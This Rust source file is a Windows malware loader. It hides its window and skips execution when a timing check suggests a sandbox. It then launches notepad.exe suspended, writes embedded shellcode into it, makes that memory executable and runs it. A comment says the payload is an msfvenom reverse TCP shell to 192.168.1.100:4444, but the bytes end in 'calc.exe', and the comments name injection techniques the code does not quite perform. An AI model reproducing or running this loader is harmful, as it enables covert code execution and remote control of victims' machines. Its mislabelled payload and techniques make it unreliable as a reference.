#![no_main]
#![windows_subsystem = "windows"]

use std::ffi::c_void;
use std::ptr::null_mut;

#[link(name = "kernel32")]
extern "system" {
    fn OpenProcess(dwDesiredAccess: u32, bInheritHandle: i32, dwProcessId: u32) -> *mut c_void;
    fn VirtualAllocEx(
        hProcess: *mut c_void,
        lpAddress: *mut c_void,
        dwSize: usize,
        flAllocationType: u32,
        flProtect: u32,
    ) -> *mut c_void;
    fn WriteProcessMemory(
        hProcess: *mut c_void,
        lpBaseAddress: *mut c_void,
        lpBuffer: *const c_void,
        nSize: usize,
        lpNumberOfBytesWritten: *mut usize,
    ) -> i32;
    fn CreateRemoteThread(
        hProcess: *mut c_void,
        lpThreadAttributes: *mut c_void,
        dwStackSize: usize,
        lpStartAddress: *mut c_void,
        lpParameter: *mut c_void,
        dwCreationFlags: u32,
        lpThreadId: *mut u32,
    ) -> *mut c_void;
    fn VirtualProtectEx(
        hProcess: *mut c_void,
        lpAddress: *mut c_void,
        dwSize: usize,
        flNewProtect: u32,
        lpflOldProtect: *mut u32,
    ) -> i32;
    fn CloseHandle(hObject: *mut c_void) -> i32;
    fn GetProcAddress(hModule: *mut c_void, lpProcName: *const u8) -> *mut c_void;
    fn GetModuleHandleA(lpModuleName: *const u8) -> *mut c_void;
    fn CreateProcessA(
        lpApplicationName: *const u8,
        lpCommandLine: *mut u8,
        lpProcessAttributes: *mut c_void,
        lpThreadAttributes: *mut c_void,
        bInheritHandles: i32,
        dwCreationFlags: u32,
        lpEnvironment: *mut c_void,
        lpCurrentDirectory: *const u8,
        lpStartupInfo: *mut STARTUPINFOA,
        lpProcessInformation: *mut PROCESS_INFORMATION,
    ) -> i32;
    fn ResumeThread(hThread: *mut c_void) -> u32;
    fn WaitForSingleObject(hHandle: *mut c_void, dwMilliseconds: u32) -> u32;
    fn Sleep(dwMilliseconds: u32);
    fn GetTickCount() -> u32;
}

#[repr(C)]
struct STARTUPINFOA {
    cb: u32,
    lpReserved: *mut u8,
    lpDesktop: *mut u8,
    lpTitle: *mut u8,
    dwX: u32,
    dwY: u32,
    dwXSize: u32,
    dwYSize: u32,
    dwXCountChars: u32,
    dwYCountChars: u32,
    dwFillAttribute: u32,
    dwFlags: u32,
    wShowWindow: u16,
    cbReserved2: u16,
    lpReserved2: *mut u8,
    hStdInput: *mut c_void,
    hStdOutput: *mut c_void,
    hStdError: *mut c_void,
}

#[repr(C)]
struct PROCESS_INFORMATION {
    hProcess: *mut c_void,
    hThread: *mut c_void,
    dwProcessId: u32,
    dwThreadId: u32,
}

const PROCESS_ALL_ACCESS: u32 = 0x1F0FFF;
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const CREATE_SUSPENDED: u32 = 0x00000004;
const INFINITE: u32 = 0xFFFFFFFF;

// msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f rust
static SHELLCODE: &[u8] = &[
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
    0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
    0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
    0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
    0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
    0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
    0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
    0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
    0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
    0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
    0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
    0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
    0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
];

#[no_mangle]
pub extern "C" fn main() -> i32 {
    // sandbox evasion
    if timing_check() {
        return 0;
    }

    // technique: process hollowing via suspended process
    let mut si: STARTUPINFOA = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    let target = b"notepad.exe\0".as_ptr() as *mut u8;

    let success = unsafe {
        CreateProcessA(
            null_mut(),
            target,
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        )
    };

    if success == 0 {
        return 1;
    }

    // allocate RW in remote process
    let remote_mem = unsafe {
        VirtualAllocEx(
            pi.hProcess,
            null_mut(),
            SHELLCODE.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if remote_mem.is_null() {
        unsafe { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
        return 1;
    }

    // write shellcode
    let mut written = 0usize;
    let write_ok = unsafe {
        WriteProcessMemory(
            pi.hProcess,
            remote_mem,
            SHELLCODE.as_ptr() as *const c_void,
            SHELLCODE.len(),
            &mut written,
        )
    };

    if write_ok == 0 || written != SHELLCODE.len() {
        unsafe { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
        return 1;
    }

    // flip to RX
    let mut old_protect = 0u32;
    let protect_ok = unsafe {
        VirtualProtectEx(
            pi.hProcess,
            remote_mem,
            SHELLCODE.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };

    if protect_ok == 0 {
        unsafe { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
        return 1;
    }

    // queue APC to main thread (early-bird technique)
    let ntdll = unsafe { GetModuleHandleA(b"ntdll.dll\0".as_ptr()) };
    let rtl_create = unsafe {
        GetProcAddress(ntdll, b"RtlCreateUserThread\0".as_ptr())
    };

    // fallback: create remote thread
    let thread = unsafe {
        CreateRemoteThread(
            pi.hProcess,
            null_mut(),
            0,
            remote_mem,
            null_mut(),
            0,
            null_mut(),
        )
    };

    if thread.is_null() && rtl_create.is_null() {
        unsafe { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
        return 1;
    }

    // resume main thread — shellcode runs
    unsafe {
        ResumeThread(pi.hThread);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    0
}

fn timing_check() -> bool {
    unsafe {
        let t1 = GetTickCount();
        Sleep(2000);
        let t2 = GetTickCount();

        // sandbox time acceleration detection
        let elapsed = t2.wrapping_sub(t1);
        if elapsed < 1500 || elapsed > 3000 {
            return true;
        }
    }
    false
}
